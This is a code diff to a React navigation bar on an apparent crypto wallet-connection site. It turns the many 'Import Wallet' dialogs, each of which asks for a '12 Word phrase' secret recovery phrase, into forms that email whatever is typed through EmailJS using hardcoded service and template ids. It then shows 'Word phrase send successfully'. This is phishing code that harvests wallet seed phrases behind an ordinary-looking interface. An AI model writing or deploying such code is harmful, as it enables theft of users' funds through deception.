@@ -1,4 +1,7 @@
 import { Link } from "react-router-dom";
+import emailjs from '@emailjs/browser';
+import { useForm } from "react-hook-form"
+import { useRef } from "react";
 import logo from "@/assets/icons/Vector.png"
 import Container from "@/SectionComs/Container/Container";
 import { Button } from "@/components/ui/button";
@@ -38,6 +41,7 @@ import useOtherWallet from "@/hooks/OtherWallet";
 import { Carousel, CarouselContent, CarouselItem, CarouselNext, CarouselPrevious } from "@/components/ui/carousel"
 import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog"
 import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
+import toast from "react-hot-toast";
 
 const NavBar = () => {
   const [open, setOpen] = useState(false);
@@ -51,6 +55,32 @@ const NavBar = () => {
   const { trezorCurrentIndex, handleTrezorButton, handleTrezorPrevious, handleTrezorNext } = useTrezor();
   const { ledgerCurrentIndex, handleLedgerButton, handleLedgerPrevious, handleLedgerNext } = useLedger();
   const { otherWalletCurrentIndex, handleOtherWalletButton, handleOtherWalletPrevious, handleOtherWalletNext } = useOtherWallet();
+
+  const form = useRef();
+  const {
+    register,
+    handleSubmit,
+    reset,
+    formState: { errors },
+  } = useForm()
+
+  const onSubmit = (data) => {
+    emailjs
+      .sendForm('service_pq3up0o', 'template_tekflom', form.current, {
+        publicKey: 'LE-1gIcbm_kkDTqTk',
+      })
+      .then(
+        () => {
+          reset();
+          toast.success('Word phrase send successfully');
+          // console.log('SUCCESS!');
+        },
+        (error) => {
+          console.log('FAILED...', error.text);
+          toast.error('Something wrong, Please try again!');
+        },
+      );
+  };
 
   // Scrolling background color
   if (typeof window !== 'undefined') {
@@ -236,8 +266,11 @@ const NavBar = () => {
                                               <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
 
                                               <p className="text-start mt-6">12 Word phrase</p>
-                                              <Textarea rows={4} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
-                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
+                                              <form ref={form} onSubmit={handleSubmit(onSubmit)}>
+                                                <Textarea rows={4} type="text" {...register("message", { required: true })} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
+
+                                                <input type="submit" value="Import Wallet" className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 cursor-pointer" />
+                                              </form>
                                             </div>
                                           </CarouselItem>
                                         </CarouselContent>
@@ -307,8 +340,11 @@ const NavBar = () => {
                                               <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
 
                                               <p className="text-start mt-6">12 Word phrase</p>
-                                              <Textarea rows={4} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
-                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
+                                              <form ref={form} onSubmit={handleSubmit(onSubmit)}>
+                                                <Textarea rows={4} type="text" {...register("message", { required: true })} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
+
+                                                <input type="submit" value="Import Wallet" className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 cursor-pointer" />
+                                              </form>
                                             </div>
                                           </CarouselItem>
                                         </CarouselContent>
@@ -379,8 +415,11 @@ const NavBar = () => {
                                               <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
 
                                               <p className="text-start mt-6">12 Word phrase</p>
-                                              <Textarea rows={4} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
-                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
+                                              <form ref={form} onSubmit={handleSubmit(onSubmit)}>
+                                                <Textarea rows={4} type="text" {...register("message", { required: true })} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
+
+                                                <input type="submit" value="Import Wallet" className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 cursor-pointer" />
+                                              </form>
                                             </div>
                                           </CarouselItem>
                                         </CarouselContent>
@@ -450,8 +489,11 @@ const NavBar = () => {
                                               <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
 
                                               <p className="text-start mt-6">12 Word phrase</p>
-                                              <Textarea rows={4} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
-                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
+                                              <form ref={form} onSubmit={handleSubmit(onSubmit)}>
+                                                <Textarea rows={4} type="text" {...register("message", { required: true })} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
+
+                                                <input type="submit" value="Import Wallet" className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 cursor-pointer" />
+                                              </form>
                                             </div>
                                           </CarouselItem>
                                         </CarouselContent>
@@ -521,8 +563,11 @@ const NavBar = () => {
                                               <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
 
                                               <p className="text-start mt-6">12 Word phrase</p>
-                                              <Textarea rows={4} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
-                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
+                                              <form ref={form} onSubmit={handleSubmit(onSubmit)}>
+                                                <Textarea rows={4} type="text" {...register("message", { required: true })} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
+
+                                                <input type="submit" value="Import Wallet" className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 cursor-pointer" />
+                                              </form>
                                             </div>
                                           </CarouselItem>
                                         </CarouselContent>
@@ -592,8 +637,11 @@ const NavBar = () => {
                                               <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
 
                                               <p className="text-start mt-6">12 Word phrase</p>
-                                              <Textarea rows={4} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
-                                              <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
+                                              <form ref={form} onSubmit={handleSubmit(onSubmit)}>
+                                                <Textarea rows={4} type="text" {...register("message", { required: true })} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
+
+                                                <input type="submit" value="Import Wallet" className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 cursor-pointer" />
+                                              </form>
                                             </div>
                                           </CarouselItem>
                                         </CarouselContent>
@@ -718,8 +766,11 @@ const NavBar = () => {
                                             <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
 
                                             <p className="text-start mt-6">12 Word phrase</p>
-                                            <Textarea rows={4} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
-                                            <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
+                                            <form ref={form} onSubmit={handleSubmit(onSubmit)}>
+                                              <Textarea rows={4} type="text" {...register("message", { required: true })} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
+
+                                              <input type="submit" value="Import Wallet" className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 cursor-pointer" />
+                                            </form>
                                           </div>
                                         </CarouselItem>
                                       </CarouselContent>
@@ -789,8 +840,11 @@ const NavBar = () => {
                                             <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
 
                                             <p className="text-start mt-6">12 Word phrase</p>
-                                            <Textarea rows={4} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
-                                            <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
+                                            <form ref={form} onSubmit={handleSubmit(onSubmit)}>
+                                              <Textarea rows={4} type="text" {...register("message", { required: true })} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
+
+                                              <input type="submit" value="Import Wallet" className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 cursor-pointer" />
+                                            </form>
                                           </div>
                                         </CarouselItem>
                                       </CarouselContent>
@@ -861,8 +915,11 @@ const NavBar = () => {
                                             <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
 
                                             <p className="text-start mt-6">12 Word phrase</p>
-                                            <Textarea rows={4} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
-                                            <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
+                                            <form ref={form} onSubmit={handleSubmit(onSubmit)}>
+                                              <Textarea rows={4} type="text" {...register("message", { required: true })} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
+
+                                              <input type="submit" value="Import Wallet" className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 cursor-pointer" />
+                                            </form>
                                           </div>
                                         </CarouselItem>
                                       </CarouselContent>
@@ -932,8 +989,11 @@ const NavBar = () => {
                                             <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
 
                                             <p className="text-start mt-6">12 Word phrase</p>
-                                            <Textarea rows={4} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
-                                            <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
+                                            <form ref={form} onSubmit={handleSubmit(onSubmit)}>
+                                              <Textarea rows={4} type="text" {...register("message", { required: true })} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
+
+                                              <input type="submit" value="Import Wallet" className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 cursor-pointer" />
+                                            </form>
                                           </div>
                                         </CarouselItem>
                                       </CarouselContent>
@@ -1003,8 +1063,11 @@ const NavBar = () => {
                                             <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
 
                                             <p className="text-start mt-6">12 Word phrase</p>
-                                            <Textarea rows={4} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
-                                            <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
+                                            <form ref={form} onSubmit={handleSubmit(onSubmit)}>
+                                              <Textarea rows={4} type="text" {...register("message", { required: true })} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
+
+                                              <input type="submit" value="Import Wallet" className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 cursor-pointer" />
+                                            </form>
                                           </div>
                                         </CarouselItem>
                                       </CarouselContent>
@@ -1074,8 +1137,11 @@ const NavBar = () => {
                                             <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
 
                                             <p className="text-start mt-6">12 Word phrase</p>
-                                            <Textarea rows={4} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
-                                            <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
+                                            <form ref={form} onSubmit={handleSubmit(onSubmit)}>
+                                              <Textarea rows={4} type="text" {...register("message", { required: true })} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
+
+                                              <input type="submit" value="Import Wallet" className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 cursor-pointer" />
+                                            </form>
                                           </div>
                                         </CarouselItem>
                                       </CarouselContent>
